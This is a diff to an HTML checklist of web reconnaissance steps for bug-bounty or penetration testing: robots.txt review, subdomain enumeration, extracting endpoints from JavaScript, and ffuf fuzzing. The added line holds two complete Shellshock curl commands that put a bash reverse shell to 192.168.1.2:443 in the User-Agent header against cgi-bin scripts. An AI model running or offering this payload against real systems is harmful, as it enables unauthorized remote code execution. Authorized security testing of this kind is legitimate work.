@@ -79,7 +79,7 @@
 <li><label><input type="checkbox"> In the main domain look at -: robots.txt :- file and try to see if you can access the Disallow files</li>
 <li><label><input type="checkbox"> enumerate the subdomains</label></li>
 <li><label><input type="checkbox"> get live subdomains with HTTPX</label></li>
-<li><label><input type="checkbox"> Try to do a request for all the subdomains with a reverse shell in the User-agent and see if you can get an RCE</label></li>
+<li><label><input type="checkbox"> Try to do a request for all the subdomains with a reverse shell in the User-agent and see if you can get an RCE : curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://target.com/cgi-bin/evil.sh" or curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "https://target.com/cgi-bin/evil.cgi"</label></li>
 <li><label><input type="checkbox"> Get the js files with tools like -: Katana :-</label></li>
 <li><label><input type="checkbox"> Extract secrets or endpoints from the js file -: curl -s https://target.com/main.js | sed ‘s/\./\n/g’ | grep ‘/api/’ | sort -u | grep -o -E ‘(https?://)?/?[{}a-z0–9A-Z_\.-]{2,}/[{}/a-z0–9A-Z_\.-]+’ :-    or -: curl -s https://app.com/main.js | sed ‘s/\./\n/g’ | grep ‘/v1/’ | sort -u :-</li>
 <li><label><input type="checkbox"> Fuzz the apis domains and apis directories and the main domain with ffuf</label></li>
